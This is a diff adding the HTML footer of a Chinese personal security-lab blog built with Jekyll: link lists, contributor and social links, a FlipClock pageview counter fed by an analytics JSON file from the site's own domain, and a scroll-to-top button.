+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.cloudflare.com/waf/" target="_blank">CloudFlare WAF</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://dash.cloudflare.com/dns/" target="_blank">CloudFlare CDN</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/features/actions" target="_blank">Github Action</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>关于</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/about/" target="_blank">近期研究</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/" target="_blank">博客</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bin4xin.github.io/wiki" target="_blank">WIKI</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>贡献者</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/bin4xin" target="_blank">本阿信</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/dnf-2008" target="_blank">夏天の风</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Yang2635" target="_blank">Yang2635</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>其他</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">帮助</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/" target="_blank">隐私</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/#cookie" target="_blank">Cookie偏好</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+            </div><!-- "/row"-->
+            <!--TODO mark-->
+            <span class="btn mr-1 color-border-accent-emphasis" title="Under construction">
+					<div class="fa fa-bug">
+                        <div class="fa fa-hand-point-down"></div>
+                        <a href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/.github/workflows/deploy.yml#L46" target="_blank">
+                        Clock counter Bug need to FIX.</a>
+                    </div>
+            </span>
+
+            <div class="pv2-ns">
+                <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l flex footer-bottom-row-margin">
+                    <!--
+   - FlipClock design
+   -    @link { https://github.com/objectivehtml/FlipClock }
+-->
+<link rel="stylesheet" href="/assets/flipclock/flipclock.css">
+<script src="/assets/flipclock/flipclock.js"></script>
+
+<div class="clock" style="margin-bottom:2em;margin-top:2em;"></div>
+<div class="flex items-center mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns" >
+    
+    
+    
+    <div id="SentinelLAB"><a class="lh-1 dib mr2" title="SentinelLAB" target="_blank" rel="noopener" href="https://www.vulbox.com/team/ERRORS"></a></div>
+    
+    
+    
+    <div id="YouTuBe"><a class="lh-1 dib mr2" title="YouTuBe" target="_blank" rel="noopener" href="https://www.youtube.com/@bin4xin"></a></div>
+    
+    
+    
+    <div id="Twitter"><a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin"></a></div>
+    
+    
+    
+    <div id="Linkedin"><a class="lh-1 dib mr2" title="Linkedin" target="_blank" rel="noopener" href="https://www.linkedin.com/#"></a></div>
+    
+    
+    
+    <div id="Facebook"><a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#"></a></div>
+    
+    
+    
+    <div id="Bilibili"><a class="lh-1 dib mr2" title="Bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/67373868"></a></div>
+    
+</div>
+<!--
+  - Ajax @para counts
+  - Jquery-return-value-undefined @link { https://stackoverflow.com/questions/13848123/jquery-return-value-undefined }
+  -->
+<script>
+    function getGAJson() {
+        let counts = null
+        $.ajax({
+            url: 'https://bin4xin.sentrylab.cn/assets/ga.json',
+            dataType: 'json', // for cross-origin access
+            timeout: 1000 * 10, // 10 secs
+            async: false,
+            success: function(data) { counts = displayPageviews(data.rows); },
+            error: function() { console.log('Failed to load Pageviews!'); }
+        });
+        return counts;
+    }
+    function displayPageviews(rows) {
+        if (rows === undefined) { return; }
+        var curPath = window.location.pathname;
+        var curFile = curPath.slice(curPath.lastIndexOf('/') + 1); // Sometimes posts will be moved.
+        var len = rows.length;
+        var cnt = 0;
+
+        for (var i = 0; i < len; ++i) {
+            var gaPath = rows[i][0];
+            var gaFile = gaPath.slice(gaPath.lastIndexOf('/') + 1);
+
+            if (gaPath === curPath || gaFile === curFile) {
+                cnt += parseInt(rows[i][1]);
+            }
+        }
+        return setInitialCount(cnt);
+        // ref @link
+        //      - { https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE }
+        //      - { https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/ }
+    }
+    // <!-- @link { https://profile-counter.glitch.me/bin4xin.github.io/count.svg } -->
+    function setInitialCount(num) {
+        var init_SiteOffset = 66749;
+        _value_site_pv = parseInt(num)
+        all_counts = init_SiteOffset + _value_site_pv
+        return all_counts
+    }
+    var clock;
+    let All_Counts = getGAJson()
+    $(document).ready(function() {
+            // Instantiate a counter
+            clock = new FlipClock($('.clock'), All_Counts , {
+            clockFace: 'Counter'
+        });
+        // Attach a click event to a button an increment the clock
+        $('.increment').click(function() {
+            //clock.setValue(10); Or you could decrease the clock // clock.decrement();
+            clock.increment();
+            // Or set it to a specific value
+            // clock.setValue(x);
+        });
+        // Attach a click event to a button a decrement the clock
+        $('.decrement').click(function() {
+            clock.decrement();
+        });
+        $('.reset').click(function() {
+            clock.reset();
+        });
+    });
+</script>
+                </div>
+            </div><!-- "/pv5" -->
+        </div>
+    </div>
+    <div class="tertiary d-flex">
+        <div class="wrapper">
+            <div class="col justify-center flex-wrap-l d-flex justify-content-center">
+                <ul class="pa1 table-of-contents flex-xl-justify-between flex-xl-column">
+                    <li class="outstanding"><a>© 2019-2025 SENTRYLAB.CN</a></li>
+                    <li class="outstanding"><a>SENTINEL SECURITY, LAB</a></li>
+                    <li class="outstanding"><a>Jekyll Ver 3.9.5.</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div><!--/footerwrap -->
+
+    </body>
+
+    <script src="/assets/js/copy.js"></script>
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+
+<!--<link rel="preload" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" as="style"/>-->
+<!--<link rel="stylesheet" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" data-n-g=""/>-->
+
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-5 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
